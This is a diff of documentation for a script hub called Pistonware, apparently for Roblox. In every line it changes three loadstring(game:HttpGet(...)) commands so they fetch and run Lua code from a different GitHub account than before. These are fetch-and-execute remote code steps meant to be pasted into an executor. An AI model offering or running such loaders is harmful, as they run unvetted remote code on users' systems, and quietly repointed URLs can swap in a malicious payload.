@@ -41,12 +41,12 @@ Public script execution:
 
 Main:
 getgenv().PistonwareChannel = 'main'
-loadstring(game:HttpGet("https://raw.githubusercontent.com/themagicpiston/pistonware/refs/heads/main/loader.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nalityemailperson-create/New-horizons/refs/heads/main/pistonware-full/loader.lua", true))()
 
 Beta:
 getgenv().PistonwareChannel = 'beta'
-loadstring(game:HttpGet("https://raw.githubusercontent.com/themagicpiston/pistonware/refs/heads/beta/loader.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nalityemailperson-create/New-horizons/refs/heads/beta/pistonware-full/loader.lua", true))()
 
 Nightly:
 getgenv().PistonwareChannel = 'nightly'
-loadstring(game:HttpGet("https://raw.githubusercontent.com/themagicpiston/pistonware/refs/heads/nightly/loader.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nalityemailperson-create/New-horizons/refs/heads/nightly/pistonware-full/loader.lua", true))()
